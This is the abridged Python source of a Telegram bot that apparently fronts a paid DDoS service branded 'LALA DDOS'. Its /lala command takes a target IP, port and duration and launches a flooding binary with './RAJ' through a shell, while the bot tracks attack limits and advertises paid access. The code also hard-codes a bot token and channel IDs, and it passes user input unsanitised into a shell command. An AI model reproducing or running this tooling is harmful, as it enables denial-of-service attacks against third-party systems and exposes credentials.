...
TOKEN = '7349049136:AAEOawbz5GiRhxckVEhSkIxwqgSLDiIGJKk'  # Replace with your actual bot token
ADMIN_IDS = [7471974865]  # Added new admin ID
CHANNEL_ID = '-1002269762641'  # Replace with your specific channel or group ID
...
EXEMPTED_USERS = [7471974865,7471974865]
...
def show_help(message):
    response = (
        ...
        "💀 `/Moin` - 🎯 *Launch your attack!* *(Verified users only)*\n"
        "📸 *Send a Photo* - 🔥 *Submit feedback!* \n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "💠 *『 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 💠\n"
        "🔄 `/reset` - ⚙️ *Reset attack limits!*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬:* [𓆩𝙇𝘼𝙇𝘼😈𝘿𝘿𝙊𝙎𓆪](https://t.me/Vansh_Rathor) 💀\n"
    )
...
def reset_attack_limit(message):
    ...
    response = (
        ...
        "━━━━━━━━━━━━━━━━━━━\n"
        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬: [Vansh](https://t.me/Vansh_Rathor) ⚡*"
    )
    bot.reply_to(message, response, parse_mode="Markdown", disable_web_page_preview=True)

# Handler for photos (feedback)
FEEDBACK_CHANNEL_ID = "-1002253744802"
last_feedback_photo = {}
...
# Verification
verified_users = set()
PRIVATE_CHANNEL_USERNAME = "lalavansh"
PRIVATE_CHANNEL_LINK = "https://t.me/lalavansh"
    ...
    try:
        ...
        if chat_member.status in ["member", "administrator", "creator"]:
            ...
            bot.send_message(
                ...
                "🔗 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗮𝗰𝗰𝗲𝘀𝘀 `/lala` 𝘀𝗲𝗿𝘃𝗶𝗰𝗲𝘀! ⚡"
            )
        else:
            bot.send_message(
                message.chat.id,
...
def TF_command(message):
    ...
    bot.send_message(
        message.chat.id,
        "✅ *𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!* 🎉\n"
        "🚀 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗮 𝗽𝗮𝗿𝘁 𝗼𝗳 𝘁𝗵𝗲 𝗲𝗹𝗶𝘁𝗲! 𝗘𝘅𝗲𝗰𝘂𝘁𝗶𝗻𝗴 `/lala`... 🔥"
    )

    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @Vansh_Rathor ( TUMHARE_PAPA ) | ]\n\nPAID AVAILABLE DM:- @Vansh_Rathor")
        return
    ...
    try:
        ...
        if len(args) != 3:
            raise ValueError("@Vansh_Rathor𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ USE THIS 👇⬇️\n/lala <IP> <PORT> <DURATION>")
        ...
        logging.info(f"Attack started by @{username}: ./RAJ {target_ip} {target_port} {default_duration} 1200")
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration, user_duration, username):
    global active_attacks
    try:
        command = f"./RAJ {target_ip} {target_port} {duration} 1200"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(
            chat_id,
            f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 𓆩𝙇𝘼𝙇𝘼😈𝘿𝘿𝙊𝙎𓆪"
        )
    except Exception as e:
